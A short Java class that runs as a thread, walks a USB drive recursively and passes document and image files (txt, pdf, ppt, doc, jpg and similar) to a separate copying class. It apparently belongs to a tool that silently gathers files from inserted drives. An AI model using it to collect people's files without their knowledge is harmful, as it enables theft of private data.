package com.company;
import java.io.File;
/**
 * Created by miyunluo on 16/10/11.
 */
public class Copy extends Thread{
    /*Suffix 保存需要拷贝的文件后缀*/
    private String[] Suffix = {"txt","pdf","ppt","pptx","doc","docx","jpg"};
    File file = null;

    public Copy(File f){this.file = f;}

    public void run() {TraverseUSB(file);}

    private void TraverseUSB(File UsbFile){
        System.out.println("USB: " + UsbFile);
        File[] UsbFiles = UsbFile.listFiles();
        for(File f : UsbFiles)
        {
            if(f.isDirectory())TraverseUSB(f);
            else{
                if(SuffixMatch(f)) new CopyToMe(f).foo();
            }
        }
    }

    public boolean SuffixMatch(File f){
        if(Suffix == null) return true;
        else{
            for(String suffix : Suffix)
                if(f.getName().endsWith("."+suffix)) return true;
        }
        return false;
    }

}

